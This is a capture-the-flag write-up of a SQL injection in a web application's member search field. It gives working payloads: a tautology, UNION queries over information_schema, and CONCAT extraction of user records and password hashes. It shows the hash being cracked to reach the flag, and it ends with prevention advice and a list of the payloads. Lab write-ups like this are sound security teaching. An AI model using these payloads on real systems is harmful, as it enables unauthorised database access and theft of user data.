# SQL Injection Vulnerability - Members Search

## Overview
This vulnerability exists in the member search functionality of the web application. By exploiting a SQL injection flaw, I was able to bypass input validation, access the entire database structure, and retrieve sensitive user information including encrypted passwords.

## Vulnerability Details
- **Type**: SQL Injection
- **Location**: Member search input field
- **Risk Level**: Critical
- **Impact**: Complete database compromise

## How I Discovered It

### Step 1: Initial Testing
I started by testing the member search field with a simple SQL injection payload:
```
Input: 1 or 1=1
```

This input gets inserted into a SQL query that looks something like:
```sql
SELECT first_name, last_name FROM users WHERE id = 1 or 1=1
```

Since `1=1` is always true, this condition bypasses the intended search logic and returns all users instead of just one.

### Step 2: Analyzing the Results
The search returned multiple users:
```
ID: 1 or 1=1
First name: one
Surname: me

ID: 1 or 1=1  
First name: two
Surname: me

ID: 1 or 1=1
First name: three
Surname: me

ID: 1 or 1=1
First name: Flag
Surname: GetThe
```

The last entry caught my attention - a user named "Flag GetThe" which looked like it might contain the challenge flag.

### Step 3: Database Exploration
I used SQL injection techniques to explore the database structure:

**Finding all tables:**
```sql
1 union SELECT table_name, table_name FROM information_schema.tables
```

**Finding all columns:**
```sql
1 UNION select table_name, column_name FROM information_schema.columns
```

This revealed the complete database schema and showed me what data was available.

### Step 4: Extracting User Data
Using a UNION attack, I extracted all user information:
```sql
1 or 1=1 union select 1, CONCAT(user_id, 0x20, first_name, 0x20, last_name, 0x20, town, 0x20, country, 0x20, planet, 0x20, Commentaire, 0x20, countersign) from users
```

*Note: `0x20` represents a space character in hexadecimal*

This revealed detailed information for user ID 5 (the "Flag" user):
```
user_id: 5
first_name: Flag
last_name: GetThe
town: 42
country: 42
planet: 42 Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Commentaire: (empty)
countersign: 5ff9d0165b4f92b14994e5c685cdce28
```

### Step 5: Decrypting the Flag
The "planet" field contained instructions: "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

The `countersign` field contained: `5ff9d0165b4f92b14994e5c685cdce28`

I followed these steps:
1. **Identified the hash type**: The 32-character string looked like an MD5 hash
2. **Cracked the MD5**: `5ff9d0165b4f92b14994e5c685cdce28` = "FortyTwo"
3. **Converted to lowercase**: "FortyTwo" → "fortytwo"  
4. **Applied SHA-256**: SHA-256("fortytwo") = `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## The Flag
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Why This Vulnerability is Dangerous

1. **Complete Database Access**: Attackers can read, modify, or delete any data in the database
2. **Data Breach**: Sensitive user information, passwords, and personal data can be stolen
3. **Authentication Bypass**: Attackers might be able to log in as any user
4. **System Compromise**: In some cases, SQL injection can lead to operating system access

## How to Prevent SQL Injection

1. **Use Prepared Statements**: Never concatenate user input directly into SQL queries
   ```php
   // BAD
   $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
   
   // GOOD  
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
   $stmt->execute([$_GET['id']]);
   ```

2. **Input Validation**: Validate and sanitize all user inputs
3. **Least Privilege**: Database users should only have the minimum permissions needed
4. **Error Handling**: Don't show detailed database errors to users
5. **Regular Security Testing**: Perform regular penetration testing and code reviews

## SQL Payloads Used

```sql
-- Basic injection test
1 or 1=1

-- Discover database tables
1 union SELECT table_name, table_name FROM information_schema.tables

-- Discover table columns  
1 UNION select table_name, column_name FROM information_schema.columns

-- Extract all user data
1 or 1=1 union select 1, CONCAT(user_id, 0x20, first_name, 0x20, last_name, 0x20, town, 0x20, country, 0x20, planet, 0x20, Commentaire, 0x20, countersign) from users

-- Extract data from other tables
1 or 1=1 union select 1, CONCAT(id, 0x20, username, 0x20, password) from db_default
```